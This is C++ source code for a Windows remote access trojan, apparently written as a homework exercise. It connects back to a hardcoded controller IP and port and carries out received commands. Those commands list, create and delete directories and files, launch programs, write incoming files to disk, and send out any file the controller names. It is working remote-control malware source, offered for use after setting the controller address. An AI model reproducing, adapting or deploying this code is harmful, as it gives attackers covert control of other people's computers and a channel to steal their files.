#undef UNICODE
#define WIN32_LEAN_AND_MEAN

//By Marc-Antoine Plourde
#include <direct.h>
#include <errno.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shellapi.h>


#pragma warning(disable:4996) //For allowing the compilation because the "fopen" method is considered "unsafe".

using namespace std;

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define BUFFLEN_SHORT_MESSAGE 256
#define BUFFLEN_LONG_MESSAGE 10000
#define BUFLEN_FILE 1000000
#define RAT_PORT "42020"
#define MASTER_IP "127.000.000.001" //The IP adress of the computer controlling the RAT server remotly. Change it and recompile before using this program.

int InitializeWinsock(WSADATA &wsaDat)
{

	int result = WSAStartup(MAKEWORD(2, 2), &wsaDat);

	return result;

}

bool CheckIResultError(int result)
{

	bool error = false;

	if (result != 0)
	{

		error = true;

	}
	else
	{

		error = false;

	}

	return error;

}


string RecvShortMessage(SOCKET &socket)
{

	bool done = false;
	int cumul = 0;
	int iResult;
	char shortMessageBuf[BUFFLEN_SHORT_MESSAGE];
	string shortMessage = "";

	while (!done)//Checking that the received message is containing all the characters.
	{

		//To receive the message
		iResult = recv(socket, &shortMessageBuf[0], BUFFLEN_SHORT_MESSAGE, 0);
		if (iResult == SOCKET_ERROR)
		{

			cout << "recv failed with error: " << WSAGetLastError() << "\n";//recv error

			closesocket(socket);

			WSACleanup();

			return shortMessage;

		}
		else
			if (iResult>0)
			{

				for (int i = cumul; i < (cumul + iResult); i++)
				{

					if (shortMessageBuf[i] == '\0')//the message was completly received 
					{

						done = true;

						for (int x = 0; x < i; x++)//copy the message in the buff into the string
						{

							shortMessage += shortMessageBuf[x];

						}

						i = (cumul + iResult);

					}

				}

			}
			else
			{

				done = true;
				int i = 0;

				while (shortMessageBuf[i] != 'Ì')
				{

					shortMessage += shortMessageBuf[i];

					i++;

				}

			}

		cumul = iResult;

	}

	return shortMessage;

}

bool SendShortMessage(SOCKET &socket, string shortMessage)
{

	int iResult;
	int shortMessageSize = (int)strlen(shortMessage.c_str());
	bool sentSuccessfully = true;

	//Sending the short message
	iResult = send(socket, shortMessage.c_str(), (shortMessageSize + 1), 0);

	if (iResult == SOCKET_ERROR)
	{

		cout << "send failed with error: " << WSAGetLastError() << "\n";

		sentSuccessfully = false;

	}
	else
	{

		cout << "send ran successfully" << "\n";

	}

	return sentSuccessfully;

}

bool SendLongMessage(SOCKET &socket, string longMessage)
{

	int iResult;
	int longMessageSize = (int)strlen(longMessage.c_str());
	bool sentSuccessfully = true;

	//Sending the short message
	iResult = send(socket, longMessage.c_str(), (longMessageSize + 1), 0);

	if (iResult == SOCKET_ERROR)
	{

		cout << "send failed with error: " << WSAGetLastError() << "\n";

		sentSuccessfully = false;

	}
	else
	{

		cout << "send ran successfully" << "\n";

	}

	return sentSuccessfully;

}


string getCD()
{
	char* cd = _getcwd(0, 0);
	string cdString = cd;
	return cdString;
}


int SendFile(SOCKET& socket, string fileName)//return 0 if ran successfully. Otherwise, it returns 1 for error management.
{

	int iResult;
	FILE* file;
	file = fopen(fileName.c_str(), "rb");
	//To check if the file exist.
	if (file != NULL)
	{

		//Send a to message to the server to let it know that the client is trying to send a non-existent file.
		if (SendShortMessage(socket, "0") == false)
		{
			fclose(file);//close the file

			return 1;

		}

		//Get the file size
		fseek(file, 0, SEEK_END);
		int fileSize = ftell(file);
		rewind(file);

		string clientAnswer = "";//0 if received, not received if it's another value
		clientAnswer = RecvShortMessage(socket);// Receives a message from to the server juste to alternate send and receive...


												//Send the file's name
		if ((SendShortMessage(socket, fileName)) == false)//failed to send the file's name to the server
		{
			fclose(file);//close the file

			return 1;
		}

		//Confirmation of reception
		if ((clientAnswer = RecvShortMessage(socket)) != "0")
		{
			fclose(file);//close the file

			return 1;//doesn't receive the message or a reception error

		}


		string fileSizeString = to_string(fileSize);//put the file's size in a c++ string

		if ((SendShortMessage(socket, fileSizeString)) == false)//If failed to send the size of the file
		{

			fclose(file);//close the file

			return 1;

		}

		if ((clientAnswer = RecvShortMessage(socket)) != "0")
		{

			fclose(file);//close the file

			return 1;

		}


		char* fileBuf = (char*)malloc(sizeof(char) * fileSize);//Allocate a memory block of the file's size to the pointer.
		if (fileBuf == NULL)
		{


			SendShortMessage(socket, "1");
			fclose(file);//close the file

			return 1;

		}



		SendShortMessage(socket, "0");




		clientAnswer = RecvShortMessage(socket);//to avoid that two messages can end up in the buffer, the client receive a useless message here just for avoiding to send two times in a row.

		size_t size;
		size = fread(fileBuf, 1, fileSize, file);
		if (size != fileSize) //Check if there is no reading error.
		{

			SendShortMessage(socket, "1");//error message for the server
			fclose(file);//close the file

			return 1;
		}

		SendShortMessage(socket, "0");

		if ((clientAnswer = RecvShortMessage(socket)) != "0")//Reception of the confirmation of reception of the confirmation of the read status (of the file to send) confirmation.
		{
			fclose(file);//close the file

			return 1;

		}


		//To send the file
		iResult = send(socket, fileBuf, fileSize, 0);
		if (iResult == SOCKET_ERROR)
		{


			fclose(file);//close the file

			return 1;

		}

		clientAnswer = RecvShortMessage(socket);
		SendShortMessage(socket, "Program sent successfully");




	}
	else//Unable to open the file
	{


		SendShortMessage(socket, "1");
		fclose(file);//close the file
		return 1;

	}

	fclose(file);//close the file
	return 0;

}

int RecvFile(SOCKET &socket)
{
	string fileSize;
	string fileName;
	string error;
	string something;//just for alternate send and receive


	if ((error = RecvShortMessage(socket)) != "0")
	{
		return 1; //client unable to open the file or error
	}

	SendShortMessage(socket, "0");


	if (((fileName = RecvShortMessage(socket)) == ""))//Receive the name of the file
	{
		return 1; //error occured in RecvShortMessage

	}

	if (SendShortMessage(socket, "0") != true)//confirmation of reception
	{
		return 1;//send error
	}

	if (((fileSize = RecvShortMessage(socket)) == ""))//If doesn't receive the size of the file
	{
		return 1; //error occured in RecvShortMessage

	}

	if (SendShortMessage(socket, "0") != true)//Send confirmation of reception
	{
		return 1;//send error
	}


	if ((RecvShortMessage(socket)) != "0")//Receive confirmation of file's memory buffer allocation
	{
		return 1;
	}

	//Send someting
	SendShortMessage(socket, "0");

	if ((RecvShortMessage(socket)) != "0")//Receive status of the reading of the file.
	{
		return 1;
	}

	SendShortMessage(socket, "0");// confirmation of reception


	bool done = false;
	int cumul = 0;
	int iResult;
	char fileBuf[BUFLEN_FILE];

	//To receive the content of the file
	while (!done)
	{

		iResult = recv(socket, fileBuf, BUFLEN_FILE, 0);// not the number of bytes to be received !!!

		cumul += iResult;

		if (iResult == SOCKET_ERROR)
		{


			return(1);
		}

		if (cumul == stoi(fileSize))
		{

			done = true;




		}
		else
		{

			if ((iResult > 0) && (cumul < stoi(fileSize)))//The client has not receive yet all the data 
			{


			}
			else //if the client doesnt receive the right number of bytes
			{

				return 1;
			}

		}

	}

	//Write the file's content on the disk
	FILE* file;
	file = fopen((getCD() + "\\" + fileName).c_str(), "wb");
	fwrite(fileBuf, sizeof(char), stoi(fileSize), file);
	fclose(file);

	SendShortMessage(socket, (fileName + " was received and written on disk successfully"));

	return 0;

}


bool Dir(SOCKET &socket)
{

	char buf[128];
	string clientAnswerBuf;
	FILE* file;
	if ((file = _popen("dir ", "rt")) == NULL)
	{
		exit(1);
	}

	//write the output pipe into clientAnswerBuf until eof or error.
	while (fgets(buf, 128, file))//for each loop of the while, send the content of the buf to the client
	{
		for (int i = 0; i < 128; i++)
		{

			if (buf[i] != (('Ì') && ('\0')))
			{
				clientAnswerBuf += buf[i];
			}
			else
			{
				i = 128;
			}

		}
	}

	//Keep that???
	//Close FILE variable  and print result
	if (feof(file))
	{
		_pclose(file);
	}
	else
	{

		_pclose(file);
		return false;//error
	}

	return SendLongMessage(socket, clientAnswerBuf);



}

bool Chdir(SOCKET &socket, string chdirParameter)
{
	string clientAnswerBuf;
	if (_chdir(chdirParameter.c_str()) == 0)
	{
		clientAnswerBuf = ("Current directory ON THE SERVER: " + getCD());
	}
	else
		if ((_chdir(chdirParameter.c_str())) == ENOENT)
		{
			clientAnswerBuf = "Directory not found ON THE SERVER";
		}
		else
			if ((_chdir(chdirParameter.c_str())) == EINVAL)
			{
				clientAnswerBuf = "Invalid buffer";
			}
			else
			{
				clientAnswerBuf = "An unknowm error occured";
			}

	return SendLongMessage(socket, clientAnswerBuf);

}

bool Mkdir(SOCKET &socket, string folderName)
{

	string clientAnswerBuf;

	//return 0 if successfully created the directory and -1 if the creation of the directory failed
	if (_mkdir((getCD() + "\\" + folderName).c_str()) == 0)//Add the current directory to the string before convert it in a C string type
	{

		clientAnswerBuf = ("Directory \"" + folderName + "\"" + " created successfully");

	}

	else
	{

		clientAnswerBuf = "An error occured while creating the directory";

	}

	return SendShortMessage(socket, clientAnswerBuf);

}

bool Rmdir(SOCKET &socket, string folderName)
{

	string clientAnswerBuf;

	//return 0 if successfully removed the directory and -1 if the removing of the directory failed
	if (_rmdir((getCD() + "\\" + folderName).c_str()) == 0)//Add the current directory to the string before convert it in a C string type
	{

		clientAnswerBuf = ("Directory \"" + folderName + "\"" + " removed successfully");

	}

	else
	{

		clientAnswerBuf = "An error occured while removing the directory";

	}

	return SendShortMessage(socket, clientAnswerBuf);

}

bool Del(SOCKET &socket, string fileName)//fileName with file extension
{
	//It's not del but the documentation link in the document of the homework is talking about the remove method, not del method...


	string clientAnswerBuf;

	//Return 0 if delete successfully. Otherwise it returns -1.
	if (remove((getCD() + "\\" + fileName).c_str()) == 0)//Add the current directory to the string before convert it in a C string type
	{

		clientAnswerBuf = "The file \"" + fileName + "\"" + " was deleted successfully";

	}
	else
	{

		clientAnswerBuf = "An error occured while deleting \"" + fileName + "\"";

	}

	return SendShortMessage(socket, clientAnswerBuf);

}

//Create a txt test file for testing the delete functionnality 
void CreateTestFile(string fileName)//file name without file extension
{

	ofstream testFile;
	testFile.open((getCD() + "\\" + fileName + ".txt").c_str());//converting a C++ string containing the cd with the name of the file and the ".txt" extension into a C string.

	testFile << "Hello world!" << "\n";

	testFile.close();

}

void Start(string fileName)//name of the file with the file extension
{

	ShellExecute(NULL, "open", fileName.c_str(), NULL, NULL, SW_SHOWNORMAL);

}

bool ControlPannel(SOCKET &socket)
{
	int choice;
	string command;
	bool quit = false;


	if ((command = RecvShortMessage(socket)) == "")//Receive a message containing the command to execute and the parameter to execute the command
	{
		return true;
	}
	else
	{
		char choiceChar = command[0];
		char choiceCharBuf[1];
		choiceCharBuf[0] = choiceChar;
		choice = atoi(choiceCharBuf);

		if (command.size()>1)//if the message contains the integer for the switch and the parameter for the task that the client ask to execute, extraction of the parameter is required.
		{

			command = command.erase(0, 1);//erase the character to select the command to execute
		}



		switch (choice)
		{
		case 0://dir
		{
			if (Dir(socket) == false)
			{
				quit = true;
			}

			break;
		}

		case 1://chdir
		{

			if (Chdir(socket, command) == false)
			{
				quit = true;
			}

			break;
		}

		case 2://mkdir
		{
			if (Mkdir(socket, command) == false)
			{
				quit = true;
			}

			break;
		}

		case 3://rmdir
		{

			if (Rmdir(socket, command) == false)
			{
				quit = true;
			}

			break;
		}

		case 4://del (with file extension)
		{

			if (Del(socket, command) == false)
			{
				quit = true;
			}

			break;
		}

		case 5://start (with file extension)
		{

			Start(command);
			SendShortMessage(socket, "0");
			break;

		}

		case 6://Create test file (without file extension)
		{

			CreateTestFile(command);
			SendShortMessage(socket, "0");
			break;
		}

		case 7://Receive a file from the client
		{

			if (RecvFile(socket) != 0)
			{
				quit = true;
			}
			break;

		}

		case 8://Send a file to the client
		{

			SendFile(socket, command);
			break;

		}

		case 9://logout
		{
			quit = true;
			break;
		}


		}
	}





	return (quit);

}


void main()
{

	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	int iResult;
	bool iResultError = false;
	string shortMessage = "";

	iResult = InitializeWinsock(wsaData);

	if ((iResultError = CheckIResultError(iResult)) == true)
	{
		return;
	}


	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;  // Address Format Internet
	hints.ai_socktype = SOCK_STREAM;  //  Provides sequenced, reliable, two-way, connection-based byte streams
	hints.ai_protocol = IPPROTO_TCP;  // Indicates that we will use TCP

									  // Resolve the server address and port
									  //       => defines port number and gets local IP address (in "result" struct)
	iResult = getaddrinfo(MASTER_IP, RAT_PORT, &hints, &result);
	if (iResult != 0)
	{

		WSACleanup();

	}


	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{

		// Create a new socket for connecting to client
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);


		// Connected to RAT client
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);//ai_addr is a struct containing IP adress and port used to etablish a connection between the RAT server and the RAT client  
		if (iResult == SOCKET_ERROR)
		{

			closesocket(ConnectSocket);

			ConnectSocket = INVALID_SOCKET;

			continue;

		}

		break;

	}

	freeaddrinfo(result);

	//if connection failed
	if (ConnectSocket == INVALID_SOCKET)
	{

		WSACleanup();
		return;
	}

	bool quit = false;
	while (quit == false)
	{
		quit = ControlPannel(ConnectSocket);
	}



	closesocket(ConnectSocket);

	WSACleanup();





}